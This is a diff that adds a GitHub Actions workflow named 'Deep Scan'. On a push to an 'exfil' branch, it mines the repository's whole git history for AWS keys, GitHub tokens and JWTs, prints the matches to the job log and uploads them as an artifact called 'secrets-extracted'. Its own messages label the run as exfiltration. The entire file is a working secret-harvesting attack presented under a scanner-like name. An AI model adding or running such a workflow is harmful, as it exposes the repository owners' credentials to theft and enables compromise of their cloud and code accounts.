@@ -1,0 +1,40 @@
+name: Deep Scan
+on:
+  push:
+    branches: [exfil]
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: write
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Extract ALL secrets
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/exfil
+          OUT=/tmp/exfil/secrets.txt
+          echo '=== EXFILTRACAO INICIADA ===' | tee $OUT
+          git log --all -p --diff-filter=M -- . > /tmp/exfil/full_diff.txt 2>/dev/null || true
+          echo '' >> $OUT
+          echo '=== AWS KEYS (AKIA/ASIA) ===' >> $OUT
+          grep -o 'A[KAS]IA[0-9A-Z]\{16\}' /tmp/exfil/full_diff.txt 2>/dev/null | sort -u >> $OUT || echo 'Nenhuma' >> $OUT
+          echo '' >> $OUT
+          echo '=== GITHUB TOKENS ===' >> $OUT
+          grep -o 'ghp_[A-Za-z0-9]\{36,\}' /tmp/exfil/full_diff.txt 2>/dev/null | sort -u >> $OUT || echo 'Nenhum' >> $OUT
+          echo '' >> $OUT
+          echo '=== JWT TOKENS ===' >> $OUT
+          grep -o 'eyJ[A-Za-z0-9_-]\{20,\}\.eyJ[A-Za-z0-9_-]\{20,\}' /tmp/exfil/full_diff.txt 2>/dev/null | sort -u >> $OUT || echo 'Nenhum' >> $OUT
+          echo '' >> $OUT
+          echo '=== EXFILTRACAO CONCLUIDA ===' >> $OUT
+          cat $OUT
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: secrets-extracted
+          path: /tmp/exfil/
